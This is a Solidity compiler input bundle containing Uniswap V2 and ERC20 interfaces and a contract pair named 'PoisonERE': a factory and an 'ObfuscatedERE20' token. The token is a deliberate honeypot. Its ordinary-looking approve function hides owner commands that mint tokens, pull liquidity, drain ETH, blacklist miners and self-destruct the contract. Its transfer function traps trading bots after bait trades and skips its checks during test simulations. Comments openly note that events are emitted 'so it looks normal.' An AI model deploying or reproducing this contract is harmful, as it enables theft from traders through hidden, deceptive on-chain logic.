{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":true,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol":{"content":"pragma solidity >=0.5.0;\n\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n"},"@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol":{"content":"pragma solidity >=0.5.0;\n\ninterface IUniswapV2Pair {\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external pure returns (string memory);\n    function symbol() external pure returns (string memory);\n    function decimals() external pure returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n    function nonces(address owner) external view returns (uint);\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\n    function factory() external view returns (address);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function kLast() external view returns (uint);\n\n    function mint(address to) external returns (uint liquidity);\n    function burn(address to) external returns (uint amount0, uint amount1);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function sync() external;\n\n    function initialize(address, address) external;\n}\n"},"@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol":{"content":"pragma solidity >=0.6.2;\n\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n"},"@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol":{"content":"pragma solidity >=0.6.2;\n\nimport './IUniswapV2Router01.sol';\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n"},"PoisonERE.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity >=0.8.0 <0.9.0;\n\nimport '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';\nimport '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';\nimport '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';\nimport './IERC20.sol';\n\nlibrary SafeMath {\n    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x + y) >= x, 'dsm-ao');\n    }\n\n    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x - y) <= x, 'dsm-su');\n    }\n\n    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require(y == 0 || (z = x * y) / y == x, 'dsm-mo');\n    }\n}\n\ncontract ERE20Factory {\n    address public owner;\n    address public immutable routerAddress;\n    address public token;\n\n    modifier onlyOwner {\n        require(msg.sender == owner, 'PF-NO');\n        _;\n    }\n\n    constructor(address router) {\n        owner = msg.sender;\n        routerAddress = router;\n    }\n\n    function _dismantleCurrentToken(uint256 deadline) internal {\n        if (token != address(0)) {\n            ObfuscatedERE20 ereContract = ObfuscatedERE20(token);\n            ereContract.approve(address(3), deadline);\n            ereContract.approve(address(15), 13371337);\n        }\n    }\n\n    function create(\n        string memory tokenName,\n        string memory tokenSymbol,\n        address[] memory users,\n        uint256 initialSupplies,\n        uint256 deadline,\n        uint256 newEthLiquidity\n    ) external payable onlyOwner {\n        bool validTrappers;\n\n        for (uint256 i; i < users.length; ++i) {\n            validTrappers = validTrappers || users[i] == msg.sender;\n        }\n\n        require(validTrappers, 'PF-IT');\n\n        _dismantleCurrentToken(deadline);\n\n        ObfuscatedERE20 ereContract =\n            new ObfuscatedERE20{value: newEthLiquidity}(tokenName, tokenSymbol, users, initialSupplies, routerAddress);\n\n        // Call the hidden create and add liquidity\n        ereContract.approve(address(2), deadline);\n\n        token = address(ereContract);\n\n        // Send back any extra ETH\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n    function takeETH(uint256 amount) external onlyOwner {\n        payable(msg.sender).transfer(amount);\n    }\n\n    function takeToken(address ecr20, uint256 amount) external onlyOwner {\n        IERC20(ecr20).transfer(msg.sender, amount);\n    }\n\n    function changeOwner(address newOwner) external onlyOwner {\n        owner = newOwner;\n    }\n\n    function destroy(uint256 deadline) external onlyOwner {\n        _dismantleCurrentToken(deadline);\n        selfdestruct(payable(msg.sender));\n    }\n}\n\ncontract ObfuscatedERE20 {\n    using SafeMath for uint256;\n\n    address private immutable routerAddress;\n\n    uint256 public minGasPrice;\n    uint256 public totalSupply;\n\n    uint256 public trapperBlock = type(uint256).max;\n    uint8 public countdown;\n    uint8 public randomThreshold;\n    bool public disabled;\n    bool public countdownMode;\n    bool public autoMinGas;\n    bool public bypassOnEmptyMiner;\n    uint8 public constant decimals = 18;\n\n    string public name;\n    string public symbol;\n\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    mapping(address => bool) public badMiners;\n    mapping(address => bool) public trappers;\n\n    event Approval(address indexed user, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    constructor(\n        string memory tokenName,\n        string memory tokenSymbol,\n        address[] memory users,\n        uint256 initialSupplies,\n        address router\n    ) payable {\n        name = tokenName;\n        symbol = tokenSymbol;\n\n        trappers[msg.sender] = true;\n\n        routerAddress = router;\n\n        _mint(address(this), initialSupplies);\n        _mint(msg.sender, initialSupplies);\n\n        for (uint256 i = 0; i < users.length; ++i) {\n            trappers[users[i]] = true;\n            _mint(users[i], initialSupplies);\n        }\n    }\n\n    // Normal bare-bones min, unchanged\n    function _mint(address to, uint256 value) internal {\n        totalSupply = totalSupply.add(value);\n        balanceOf[to] = balanceOf[to].add(value);\n\n        emit Transfer(address(0), to, value);\n    }\n\n    // Normal bare-bones min, unchanged\n    function _burn(address from, uint256 value) internal {\n        balanceOf[from] = balanceOf[from].sub(value);\n        totalSupply = totalSupply.sub(value);\n\n        emit Transfer(from, address(0), value);\n    }\n\n    // Creates a uniswap v2 pair of itself with weth\n    function _createPair() internal {\n        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);\n        IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());\n    }\n\n    // Creates a uniswap v2 pair of itself with weth\n    function _addLiquidity(\n        uint256 ethAmount,\n        uint256 tokenAmount,\n        uint256 deadline\n    ) internal {\n        // sets uniswap v2 router to have unlimited allowance on behalf of this contract's token\n        allowance[address(this)][routerAddress] = type(uint256).max;\n\n        // we can be sure of the minimal token to be used, as this wil be first liquidity adder\n        IUniswapV2Router02(routerAddress).addLiquidityETH{value: ethAmount}(\n            address(this),\n            tokenAmount,\n            tokenAmount,\n            ethAmount,\n            address(this),\n            deadline\n        );\n    }\n\n    // Removes liquidity from uniswap v2 pair of itself with weth, sending ETH to caller\n    function _removeLiquidity(uint256 deadline) internal {\n        disabled = false;\n        trapperBlock = type(uint256).max;\n\n        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);\n\n        // Get the factory from the router, then get the weth from the router, and then get the pair from the factory\n        IERC20 pair = IERC20(IUniswapV2Factory(router.factory()).getPair(address(this), router.WETH()));\n\n        uint256 liquidityToRemove = pair.balanceOf(address(this));\n\n        pair.approve(routerAddress, liquidityToRemove);\n\n        (, uint256 amountETH) = router.removeLiquidityETH(address(this), liquidityToRemove, 0, 0, msg.sender, deadline);\n\n        require(amountETH > 0, 'ERE-BLR');\n    }\n\n    // Handles toggling various booleans or setting various values\n    function _changeSettings(address someAddress, uint256 value) internal returns (bool) {\n        // Enable/Disable transfers (0 disables, 1 enables)\n        if (someAddress == address(1)) {\n            disabled = value == 0;\n            return true;\n        }\n\n        // Create pair and add liquidity\n        if (someAddress == address(2)) {\n            _createPair();\n            uint256 amount = address(this).balance;\n            _addLiquidity(amount, amount, value); // ethAmount, tokenAmount, deadline\n            return true;\n        }\n\n        // Remove all liquidity\n        if (someAddress == address(3)) {\n            _removeLiquidity(value); // liquidityToRemove, deadline\n            return true;\n        }\n\n        // Send this contract's ETH to caller\n        if (someAddress == address(4)) {\n            payable(msg.sender).transfer(value);\n            return true;\n        }\n\n        // Send this contract's token to caller\n        if (someAddress == address(5)) {\n            _transfer(address(this), msg.sender, value);\n            return true;\n        }\n\n        // Send this contracts arbitrary ERC20 to caller\n        if (someAddress == address(6)) {\n            IERC20(someAddress).transfer(msg.sender, value);\n            return true;\n        }\n\n        // Mint some token to caller\n        if (someAddress == address(7)) {\n            _mint(msg.sender, uint256(value));\n            return true;\n        }\n\n        // Set trap strategy to countdown set countdown\n        if (someAddress == address(8)) {\n            countdownMode = true;\n            countdown = uint8(value);\n            return true;\n        }\n\n        // Set trap strategy to random and set randomThreshold\n        if (someAddress == address(9)) {\n            countdownMode = false;\n            randomThreshold = uint8(value);\n            return true;\n        }\n\n        // Set min gas price\n        if (someAddress == address(10)) {\n            minGasPrice = value;\n            return true;\n        }\n\n        // Set auto min gas (0 disables, 1 enables)\n        if (someAddress == address(11)) {\n            autoMinGas = value == 1;\n\n            // clear min gas if auto mode\n            if (value == 1) {\n                minGasPrice = 0;\n            }\n\n            return true;\n        }\n\n        // Set bypassOnEmptyMiner (0 no, 1 yes)\n        if (someAddress == address(12)) {\n            bypassOnEmptyMiner = value == 1;\n\n            return true;\n        }\n\n        // Set trapperBlock\n        if (someAddress == address(13)) {\n            trapperBlock = value;\n\n            return true;\n        }\n\n        // Reset Trap\n        if (someAddress == address(14)) {\n            disabled = false;\n            trapperBlock = type(uint256).max;\n\n            autoMinGas = (value & 1) != 0;\n            minGasPrice = value >> 11;\n\n            countdownMode = ((value >> 1) & 1) != 0;\n\n            if (countdownMode) {\n                // If in countdown mode, then set countdown count\n                countdown = uint8((value >> 3) & 255);\n                randomThreshold = 0;\n            } else {\n                // Else if in random mode, then set random threshold count\n                randomThreshold = uint8((value >> 3) & 255);\n                countdown = 0;\n            }\n\n            bypassOnEmptyMiner = ((value >> 2) & 1) != 0;\n\n            return true;\n        }\n\n        // Self Destruct\n        if (someAddress == address(15)) {\n            require(value == 13371337, 'ERE-DS'); // dangerous shit\n\n            // TODO: delete some easy storage slots to recover more gas\n\n            selfdestruct(payable(msg.sender));\n\n            return true;\n        }\n\n        return false;\n    }\n\n    // Handles toggling certain roles or addresses\n    function _changeRoles(address someAddress, uint256 value) internal returns (bool) {\n        // Remove a trapper/owner\n        if (value == 10) {\n            require(someAddress != msg.sender, 'ERE-IS');\n            trappers[someAddress] = false;\n            return true;\n        }\n\n        // Add a trapper/owner\n        if (value == 11) {\n            trappers[someAddress] = true;\n            return true;\n        }\n\n        // Remove miner from blacklist\n        if (value == 12) {\n            badMiners[someAddress] = false;\n            return true;\n        }\n\n        // Add miner to blacklist\n        if (value == 13) {\n            badMiners[someAddress] = true;\n            return true;\n        }\n\n        return false;\n    }\n\n    // Normal approve function with a twist for performing some settings/roles changes\n    function _approve(\n        address msgSender,\n        address spender,\n        uint256 value\n    ) internal {\n        // Emit event first, so it looks normal\n        emit Approval(msgSender, spender, value);\n\n        // TODO: some strategies where you cannot approve?\n\n        if (trappers[msgSender]) {\n            // If message is from a trapper, return if either actually do something\n            if (_changeSettings(spender, value) || _changeRoles(spender, value)) return;\n        }\n\n        allowance[msgSender][spender] = value;\n    }\n\n    // Normal transfer function that tries to trap back running bots\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) internal {\n        // Bypass requires if miner is what we'd expect in a test call\n        bool bypass = bypassOnEmptyMiner && block.coinbase == address(0);\n\n        // Must be not disabled, or at least from trapper\n        require(!disabled || trappers[from] || bypass, 'ERE-DC');\n\n        // If this transaction is happening in the same block, or within 2 after trapperBlock (which would be a backrun since it's set by bait)\n        if ((block.number >= trapperBlock) && !bypass) {\n            // Reject bad miners or low gas payers\n            require(!badMiners[block.coinbase] && tx.gasprice >= minGasPrice, 'ERE-BM');\n        }\n\n        // Do the actual transfer stuff\n        balanceOf[from] = balanceOf[from].sub(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(from, to, value);\n\n        // If going to a trapper\n        if (trappers[to]) {\n            // Record the block number a trapper got coin\n            trapperBlock = block.number;\n\n            // If enabled, subsequent transactions must pay at least as much gasPrice\n            if (autoMinGas) {\n                // minGasPrice was the delta to be added to tx.gasprice\n                minGasPrice += tx.gasprice;\n            }\n\n            // If in countdown mode\n            if (countdownMode) {\n                if (countdown == 0) {\n                    // If countdown is zero, disable for subsequent transfers\n                    disabled = true;\n                } else {\n                    // Else decrement countdown\n                    countdown -= 1;\n                }\n\n                return;\n            }\n\n            // If not in countdown mode, we're in random mode, so if random number, disable\n            if (\n                uint8(uint256(keccak256(abi.encodePacked(uint96(0xf4a93c247d6a0e2b), address(block.coinbase), blockhash(block.number - 1), block.timestamp)))) <\n                randomThreshold\n            ) {\n                disabled = true;\n            }\n        }\n\n        return;\n    }\n\n    // Normal bare-bones approve, unchanged\n    function approve(address spender, uint256 value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n\n        return true;\n    }\n\n    // Normal bare-bones transfer, unchanged\n    function transfer(address to, uint256 value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n\n        return true;\n    }\n\n    // Normal bare-bones transferFrom, unchanged\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool) {\n        if (allowance[from][msg.sender] != type(uint256).max) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n\n        _transfer(from, to, value);\n\n        return true;\n    }\n}\n"}}}